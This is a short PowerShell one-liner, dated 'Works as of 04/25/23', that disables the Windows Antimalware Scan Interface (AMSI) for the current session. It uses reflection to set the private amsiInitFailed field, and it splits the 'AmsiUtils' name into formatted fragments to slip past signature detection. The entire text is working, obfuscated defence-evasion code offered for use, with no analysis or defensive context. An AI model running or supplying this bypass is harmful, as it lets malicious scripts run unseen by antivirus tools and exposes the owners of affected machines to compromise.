# Works as of 04/25/23
$a,$b='si','Am';$r=[Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils'-f$b,$a));$z=$r.GetField(('am{0}InitFailed'-f$a),'NonPublic,Static');$z.SetValue($null,$true)
